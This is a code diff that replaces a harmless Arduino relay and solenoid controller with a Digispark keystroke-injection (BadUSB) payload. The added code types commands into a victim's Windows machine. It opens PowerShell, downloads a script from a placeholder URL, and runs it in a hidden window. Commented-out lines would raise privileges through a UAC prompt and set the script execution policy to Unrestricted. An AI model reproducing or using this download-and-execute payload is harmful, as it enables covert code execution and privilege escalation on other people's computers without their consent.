@@ -1,62 +1,35 @@
-const int RELAY_1 = 2;
-const int RELAY_2 = 3;
-const int RELAY_3 = 4;
-const int RELAY_4 = 5;
-int intSolenoid1 = 0;
-String strSolenoid1 = "";
-
-void setup()
-{
-    Serial.begin(9600);
-    pinMode(RELAY_1, OUTPUT);
-    pinMode(RELAY_2, OUTPUT);
-    pinMode(RELAY_3, OUTPUT);
-    pinMode(RELAY_4, OUTPUT);
-    
-    //Turn relay off at startup.
-    digitalWrite(RELAY_1, HIGH);
-    digitalWrite(RELAY_2, HIGH);
-    digitalWrite(RELAY_3, HIGH);
-    digitalWrite(RELAY_4, HIGH);
+#include "DigiKeyboard.h"
+void setup() {
 }
 
-void loop()
-{
-    while(Serial.available()>0) 
-    { 
-      switch(Serial.read()) 
-      { 
-        case '0': 
-          digitalWrite(RELAY_1, HIGH);
-        break; 
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("$client = new-object System.Net.WebClient");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("$client.DownloadFile(\"https://scriptURL\" , \"script.ps1\")");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
+  DigiKeyboard.delay(750);
+  //If the system hasn't been configured to run scripts, uncomment the lines bellow
+  //DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
+  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //DigiKeyboard.delay(750);
+  //DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
+  //DigiKeyboard.delay(750);
+  //DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //DigiKeyboard.delay(750);
+  DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for (;;) {
+    /*empty*/
+  }
 
-        case '1':
-          digitalWrite(RELAY_1, LOW);
-        break; 
-
-        case '2':
-          digitalWrite(RELAY_2, HIGH);
-        break; 
-
-        case '3':
-          digitalWrite(RELAY_2, LOW);
-        break; 
-
-        case '4':
-          digitalWrite(RELAY_3, HIGH);
-        break; 
-
-        case '5':
-          digitalWrite(RELAY_3, LOW);
-        break; 
-
-        case '6':
-          digitalWrite(RELAY_3, HIGH);
-        break; 
-
-        case '7':
-          digitalWrite(RELAY_3, LOW);
-        break; 
-      } 
-    }
 }
